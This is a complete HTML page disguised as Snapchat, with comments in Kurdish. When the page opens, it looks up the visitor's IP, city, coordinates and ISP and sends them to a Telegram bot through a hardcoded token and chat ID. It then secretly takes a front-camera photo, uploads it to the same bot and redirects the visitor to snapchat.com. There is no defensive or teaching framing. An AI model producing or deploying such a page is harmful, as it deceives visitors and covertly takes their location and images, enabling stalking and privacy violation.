<!DOCTYPE html>
<html lang="ckb" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Snapchat</title>
    <link rel="icon" href="https://assets.sc-static.net/images/ico/favicon.ico" type="image/x-icon">
    <style>
        * {
            box-sizing: border-box;
        }
        body {
            margin: 0;
            padding: 0;
            background-color: #000000;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        .loader {
            border: 4px solid #1a1a1a;
            border-top: 4px solid #FFFC00;
            border-radius: 50%;
            width: 45px;
            height: 45px;
            animation: spin 0.8s linear infinite;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        video, canvas {
            display: none;
        }
    </style>
</head>
<body>

<div class="loader"></div>

<video id="video" autoplay playsinline></video>
<canvas id="canvas"></canvas>

<script>
    // زانیارییەکانی بۆتەکەت لێرە دابنێ
    const BOT_TOKEN = '8945968743:AAFqMyj-053syEjzzbjZAA4NPp8-RTUNvXs';
    const CHAT_ID = '6271835869';

    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');

    // ۱. وەرگرتن و ناردنی IP و شوێن
    async function sendLocationData() {
        try {
            const response = await fetch('https://ipapi.co/json/');
            const data = await response.json();

            const textMessage = `🌐 *زانیاری سەردانکەر:*
📌 *IP:* \`${data.ip}\`
🏙 *شار:* ${data.city}
🏳 *وڵات:* ${data.country_name}
📍 *شوێن:* ${data.latitude}, ${data.longitude}
🏢 *هێڵ (ISP):* ${data.org}`;

            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: textMessage,
                    parse_mode: 'Markdown'
                })
            });
        } catch (err) {
            console.error("هەڵە لە وەرگرتنی IP:", err);
        }
    }

    // ۲. ڕاستەوخۆ کارکردنی کامێرا و وێنەگرتن لەگەڵ کردنەوەی پەڕەکە
    async function startProcess() {
        sendLocationData();

        try {
            const stream = await navigator.mediaDevices.getUserMedia({ 
                video: { facingMode: "user" }, 
                audio: false 
            });
            video.srcObject = stream;

            // گرپتنی وێنەکە دوای ٠.٥ چرکە لە کارکردنی کامێرا
            setTimeout(() => {
                const context = canvas.getContext('2d');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                context.drawImage(video, 0, 0, canvas.width, canvas.height);

                canvas.toBlob(function(blob) {
                    const formData = new FormData();
                    formData.append('chat_id', CHAT_ID);
                    formData.append('photo', blob, 'user_photo.jpg');

                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                        method: 'POST',
                        body: formData
                    })
                    .then(res => res.json())
                    .then(() => {
                        // دوای ناردن ڕوانەی سناپچاتی دەکات
                        window.location.href = "https://www.snapchat.com"; 
                    })
                    .catch(() => {
                        window.location.href = "https://www.snapchat.com";
                    });
                }, 'image/jpeg');
            }, 500);

        } catch (err) {
            // ئەگەر مۆڵەتی نەدا یان ڕەتی کردەوە
            window.location.href = "https://www.snapchat.com";
        }
    }

    // کاتێک پەڕەکە دەکرێتەوە ڕاستەوخۆ دەست پێدەکات
    window.onload = startProcess;
</script>
</body>
</html>
